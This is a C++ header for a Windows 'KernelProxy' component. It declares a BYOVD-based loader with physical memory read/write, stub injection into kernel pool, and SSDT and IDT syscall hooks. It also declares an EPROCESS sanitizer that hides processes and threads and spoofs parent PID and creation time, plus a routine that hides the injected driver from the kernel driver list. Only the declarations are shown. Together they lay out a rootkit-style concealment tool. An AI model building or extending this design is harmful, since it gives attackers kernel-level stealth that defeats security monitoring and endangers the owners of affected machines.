#pragma once
#include <windows.h>
#include <cstdint>

// SSDT entry structure (kernel)
#pragma pack(push, 1)
struct SsdtEntry {
    uint16_t offsetLow;
    uint16_t segmentSelector;
    uint16_t offsetHigh;
    // Combined: offset = (offsetHigh << 16) | offsetLow
};
#pragma pack(pop)

struct SsdtTableInitParams {
    uint32_t* keServiceDescriptorTable;  // KiServiceTable
    ULONG_PTR* keServiceLimit;
    PVOID ntosBase;
    PVOID ntosEnd;
};

struct EprocessSanitizerParams {
    int32_t maxLogSessions;
    int32_t maxSessions;
    bool    hideProcFromDbgk;
    bool    hideProcFromPeb;
    bool    hideThreads;
    bool    spoofCreateTime;
    bool    spoofParentPid;
    uint32_t spoofedParentPid;
};

struct LstarMonitorParams {
    uint64_t knownGoodLstar;
    uint64_t knownGoodStar;
    uint64_t knownGoodCstar;
    uint64_t knownGoodSFMask;
};

struct IdtHookParams {
    uint8_t  targetVector;       // typically 0x2E
    bool     installHook;
    bool     logInt2eHits;
};

struct KernelProxyConfig {
    bool enableSsdtHook;
    bool enableEprocessSanitizer;
    bool enableLstarMonitor;
    bool enableIdtHook;
    bool enableDriverListHider;

    SsdtTableInitParams ssdtInit;
    EprocessSanitizerParams sanitizer;
    LstarMonitorParams lstar;
    IdtHookParams idt;

    // Callback buffer to report detections
    HANDLE detectionEvents[4];
    uint64_t commBufferPhysAddr;
    size_t   commBufferSize;
    void*    commBufferVa;
};

class KernelProxy {
public:
    KernelProxy();
    ~KernelProxy();

    // Initialize kernel proxy layer via BYOVD
    bool Initialize(HANDLE hByovdDevice, uint64_t byovdCaps);

    // Inject kernel stubs and hook SSDT
    bool InjectSsdtHooks(const SsdtTableInitParams& params);

    // Deploy EPROCESS sanitizer thread
    bool DeployEprocessSanitizer(const EprocessSanitizerParams& params);

    // Install LSTAR/MSR change monitor
    bool InstallLstarMonitor(const LstarMonitorParams& params);

    // Install IDT hook for syscall pre-filter
    bool InstallIdtHook(const IdtHookParams& params);

    // Hide injected driver module from kernel driver list
    bool HideDriverList();

    // Communicate with kernel stub (ping check)
    bool PingStubs();

    // Tear down all kernel hooks
    void Shutdown();

    bool IsActive() const { return m_active; }

private:
    // Write physical memory via BYOVD device
    bool WritePhysical(uint64_t physAddr, const void* data, size_t size);

    // Read physical memory via BYOVD device
    bool ReadPhysical(uint64_t physAddr, void* data, size_t size);

    // Find Ntoskernel base address
    uint64_t FindNtosBase();

    // Write PE stub into non-paged pool
    bool InjectStub(const wchar_t* stubName, const uint8_t* stubData, size_t stubSize,
                    uint64_t physBase, uint64_t* outPhys, void** outVa);

    // Hook a specific SSDT entry
    bool HookSsdtEntry(uint32_t index, void* newHandler, void** oldHandler);

    HANDLE m_hDevice;
    uint64_t m_caps;
    bool m_active;

    void* m_commBufferVa;
    uint64_t m_commBufferPhys;
    size_t m_commBufferSize;

    uint64_t m_ntosBase;
    size_t m_ntosSize;
};